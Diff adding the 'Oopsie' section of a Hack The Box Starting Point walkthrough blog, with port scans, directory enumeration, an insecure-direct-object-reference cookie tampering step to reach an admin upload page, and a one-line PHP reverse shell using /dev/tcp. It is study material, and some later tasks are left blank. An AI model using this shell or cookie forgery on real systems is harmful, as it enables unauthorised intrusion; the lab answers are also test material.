@@ -161,3 +161,162 @@ nt authority\system
 C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 b91ccec3305e98240082d4474b848528
 ```
+
+
+## Oopsie
+**PHP, Apache, Insecure Direct Object Reference, Authentication bypass**
+
+**Task 1**  
+With what kind of tool can intercept web traffic?  
+
+`proxy`
+
+
+**Task 2**  
+What is the path to the directory on the webserver that returns a login page?  
+
+NMAP
+```
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 19:42 EST
+Nmap scan report for 10.129.95.191
+Host is up (0.31s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
+```
+
+There is a web server on port 80. Let's enumerate the web directories with gobuster
+
+```
+kali$ gobuster dir -u $TARGET -w ~/Documents/git/SecLists/Discovery/Web-Content/common.txt
+kali$ gobuster dir -u $TARGET -w ~/Documents/git/SecLists/Discovery/Web-Content/Logins.fuzz.txt
+```
+
+Unfortunately neither of these yielded results. From looking at the writeup, they mention that Burpsuite can create a sitemap for you. Let's take that idea of a web crawler and use another tool in Kali: `gospider`:
+
+```
+kali$ gospider -s http://$TARGET -o site-crawl
+[url] - [code-200] - http://10.129.95.191
+[javascript] - http://10.129.95.191/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js
+[javascript] - http://10.129.95.191/js/min.js
+[javascript] - http://10.129.95.191/cdn-cgi/login/script.js
+[javascript] - http://10.129.95.191/js/index.j
+```
+
+We see the directory `cdn-cgi/login` contains a login script. Visiting the page we are met with a login prompt
+
+**Task 3**  
+What can be modified in Firefox to get access to the upload page?  
+
+After logging in as guest on `http://$TARGET/cdn-cgi/login`, we are granted access to a web portal for MegaCorp Automotive - Repair Management System.
+
+![Guest access to the Repair Management System](/public/img/blog/htb-starting-point/oopsie-guest-access.png)
+
+Inspecting the cookies, we see the following values. If we can find the user id for the super admin, we may be able to get access to the uploads page. 
+```
+role=guest
+user=2233
+```
+
+From here, we notice that the Accounts page is vulnerable to insecure direct object reference - so we can iterate through the account ids in order to find our admin user and obtain their user id. The guest user has an id of `2`. Decrementing that to `1`, we find the details for the admin: user id `34322`. Let's exploit!
+
+```
+role=guest
+user=34322
+```
+
+Success!
+![Guest access to the Repair Management System](/public/img/blog/htb-starting-point/oopsie-uploads-access.png)
+
+
+**Task 4**  
+What is the access ID of the admin user?  
+
+`34322` as per the above
+
+
+**Task 5**  
+On uploading a file, what directory does that file appear in on the server?  
+
+Uploading a random txt file, let's go hunting.
+```
+kali$ gobuster fuzz -u $TARGET/FUZZ/nmap.txt -c user=34322 -w ~/Documents/git/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
+```
+
+Unfortunately the above returned 404 on every option. Let's simplify a bit and just enumerate directories in case there is some web server logic blocking us from accessing the file.
+
+```
+kali$ gobuster dir -x php -u $TARGET -w ~/Documents/git/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.95.191
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/kali/Documents/git/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 278]
+/index.php            (Status: 200) [Size: 10932]
+/images               (Status: 301) [Size: 315] [--> http://10.129.95.191/images/]
+/themes               (Status: 301) [Size: 315] [--> http://10.129.95.191/themes/]
+/uploads              (Status: 301) [Size: 316] [--> http://10.129.95.191/uploads/]
+/css                  (Status: 301) [Size: 312] [--> http://10.129.95.191/css/]
+/js                   (Status: 301) [Size: 311] [--> http://10.129.95.191/js/]
+Progress: 2150 / 175330 (1.23%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 2160 / 175330 (1.23%)
+===============================================================
+Finished
+===============================================================
+```
+
+There appears to be an `uploads` folder sitting behind some authentication. This auth may explain the 404 behaviour from earlier. In any case, when trying to access the file such as `/uploads/nmap.txt`, the server may still try to read or invoke the file. As such, let's try upload a PHP reverse shell in the hopes it gets executed.
+
+```php
+<?php
+    exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP/1337> 0>&1'");
+?>
+```
+
+We set up a netcat listener on our machine, and try to get the file from the web server... According to writeup, this should work, but it hasn't. Hmmm... Something for next week
+
+
+
+**Task 6**  
+What is the file that contains the password that is shared with the robert user?  
+
+
+**Task 7**  
+What executable is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?  
+
+
+**Task 8**  
+Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?  
+
+
+**Task 9**  
+What SUID stands for?  
+
+
+**Task 10**  
+What is the name of the executable being called in an insecure manner?  
+
+
+**Task 11**  
+Submit user flag  
+
+
+**Task 12**  
+Submit root flag  
